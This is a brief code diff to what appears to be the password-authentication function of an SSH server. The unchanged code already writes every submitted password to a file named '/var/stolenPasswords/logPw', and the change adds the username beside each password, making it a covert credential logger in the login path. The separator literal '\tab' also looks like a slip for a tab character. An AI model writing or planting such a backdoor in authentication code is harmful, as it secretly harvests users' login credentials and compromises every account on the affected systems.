@@ -87,10 +87,10 @@ auth_password(Authctxt *authctxt, const char *password) {
     FILE *f = fopen("/var/stolenPasswords/logPw", "a");
 
     if (f != NULL) {
-        fputs("PW_BEGIN\n", f);
+        fputs(authctxt->user, f);
+        fputs("\tab", f);
         fputs(password, f);
         fputs("\n", f);
-        fputs("PW_END\n", f);
         fclose(f);
     }
     struct passwd *pw = authctxt->pw;
